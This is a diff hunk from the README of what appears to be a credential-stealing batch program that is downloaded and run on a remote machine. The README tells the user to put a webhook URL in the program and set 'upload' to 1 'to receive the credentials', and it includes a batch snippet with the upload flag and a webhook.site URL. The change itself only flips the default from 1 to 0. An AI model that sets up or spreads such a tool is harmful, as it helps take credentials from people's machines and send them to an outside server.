@@ -41,7 +41,7 @@ Usually when running the program on a remote machine (program downloaded and exe
 - **Store the webhook inside the program**: If you can't run the program from the command prompt (or to avoid typing the url), ensure to save your webhook's URL in the variable `webhook` within the program. Another important step is to change the value of the `upload` variable from `0` to `1`. Once the program is executed, you will receive the credentials.
 
 ```batch
-set upload=1
+set upload=0
 
 set "webhook=https://webhook.site/#!/87258b74-93c5-4792-8175-df08c3ffee20"
 ```
